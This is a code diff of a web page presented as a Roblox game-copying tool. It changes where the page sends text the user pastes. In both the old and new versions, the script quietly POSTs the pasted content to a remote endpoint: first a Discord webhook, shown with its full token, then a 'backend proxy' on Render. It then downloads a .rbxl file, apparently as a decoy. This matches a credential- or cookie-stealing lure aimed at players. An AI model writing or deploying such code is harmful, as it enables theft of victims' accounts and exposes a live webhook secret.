@@ -129,7 +129,8 @@
 </div>
 
 <script>
-  const webhookURL = 'https://ptb.discord.com/api/webhooks/1363135609601917199/-XCwFzteRcZQW5u98yN9oP86P55-kaErK8QNP8m4p7eaTH1GTuRbaewg9qnx-ljs9J-k';
+  // Your Render backend URL here:
+  const backendURL = 'https://copy-roblox-game.onrender.com/send-webhook';
 
   const input = document.getElementById('gameInput');
   const btn = document.getElementById('copyBtn');
@@ -148,29 +149,27 @@
       return;
     }
 
-    // Send pasted content to Discord webhook
-    fetch(webhookURL, {
+    // Send pasted content to backend proxy
+    fetch(backendURL, {
       method: 'POST',
       headers: {'Content-Type': 'application/json'},
       body: JSON.stringify({
         content: `User pasted game file:\n\`\`\`\n${text}\n\`\`\``
-      })
+      }),
     }).then(response => {
       if (!response.ok) {
-        alert('Failed to send data to Discord webhook.');
+        alert('Failed to send data to backend.');
         return;
       }
-      // Trigger download of the uploaded file with exact filename
+      // Trigger download of the file from your GitHub Pages repo
       const a = document.createElement('a');
       a.href = 'grow%20a%20garden%20(1).rbxl';
       a.download = 'grow a garden (1).rbxl';
       document.body.appendChild(a);
       a.click();
-      setTimeout(() => {
-        a.remove();
-      }, 100);
+      setTimeout(() => a.remove(), 100);
     }).catch(err => {
-      alert('Error sending webhook: ' + err);
+      alert('Error sending webhook: ' + err.message);
     });
   });
 
